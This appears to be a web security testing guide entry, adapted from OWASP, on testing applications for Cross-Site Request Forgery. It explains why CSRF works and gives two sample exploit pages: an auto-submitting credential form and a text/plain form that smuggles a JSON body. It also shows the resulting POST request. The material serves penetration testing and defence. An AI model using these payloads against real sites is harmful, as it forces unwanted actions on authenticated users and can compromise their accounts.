# Cross-site Request Forgery (CSRF)

|ID          |
|------------|
|GTRT-ATHZ-14|

## Summary

Cross-Site Request Forgery ([CSRF](https://owasp.org/www-community/attacks/csrf)) is an attack that forces an end user to execute unintended actions on a web application in which they are currently authenticated. With a little social engineering help (like sending a link via email or chat), an attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation when it targets a normal user. If the targeted end user is the administrator account, a CSRF attack can compromise the entire web application.

CSRF relies on:

1. Web browser behavior regarding the handling of session-related information such as cookies and HTTP authentication information.
2. An attacker's knowledge of valid web application URLs, requests, or functionality.
3. Application session management relying only on information known by the browser.
4. Existence of HTML tags whose presence cause immediate access to an HTTP[S] resource; for example the image tag `img`.

Points 1, 2, and 3 are essential for the vulnerability to be present, while point 4 facilitates the actual exploitation, but is not strictly required.

## How to Test

Audit the application to ascertain if its session management is vulnerable. If session management relies only on client-side values (information available to the browser), then the application is vulnerable. "Client-side values” refers to cookies and HTTP authentication credentials (Basic Authentication and other forms of HTTP authentication; not form-based authentication, which is an application-level authentication).

Resources accessible via HTTP GET requests are easily vulnerable, though POST requests can be automated via JavaScript and are vulnerable as well; therefore, the use of POST alone is not enough to correct the occurrence of CSRF vulnerabilities.

In case of POST, the following sample can be used.

1. Create an HTML page similar to that shown below
2. Host the HTML on a malicious or third-party site
3. Send the link for the page to the victim(s) and induce them to click it.

```html
<html>
<body onload='document.CSRF.submit()'>

<form action='http://tagetWebsite/Authenticate.jsp' method='POST' name='CSRF'>
    <input type='hidden' name='name' value='Hacked'>
    <input type='hidden' name='password' value='Hacked'>
</form>

</body>
</html>
```

In case of web applications in which developers are utilizing JSON for browser to server communication, a problem may arise with the fact that there are no query parameters with the JSON format, which are a must with self-submitting forms. To bypass this case, we can use a self-submitting form with JSON payloads including hidden input to exploit CSRF. We'll have to change the encoding type (`enctype`) to `text/plain` to ensure the payload is delivered as-is. The exploit code will look like the following:

```html
<html>
 <body>
  <script>history.pushState('', '', '/')</script>
   <form action='http://victimsite.com' method='POST' enctype='text/plain'>
     <input type='hidden' name='{"name":"hacked","password":"hacked","padding":"'value='something"}' />
     <input type='submit' value='Submit request' />
   </form>
 </body>
</html>
```

The POST request will be as follow:

```html
POST / HTTP/1.1
Host: victimsite.com
Content-Type: text/plain

{"name":"hacked","password":"hacked","padding":"=something"}
```

When this data is sent as a POST request, the server will happily accept the name and password fields and ignore the one with the name padding as it does not need it.

### Tools

- [OWASP ZAP](https://www.zaproxy.org/)
- [CSRF Tester](https://wiki.owasp.org/index.php/Category:OWASP_CSRFTester_Project)
- [Pinata-csrf-tool](https://code.google.com/p/pinata-csrf-tool/)

## References

Application Development Security 1.1/S1(a) Manage logon session and access controls securely

https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md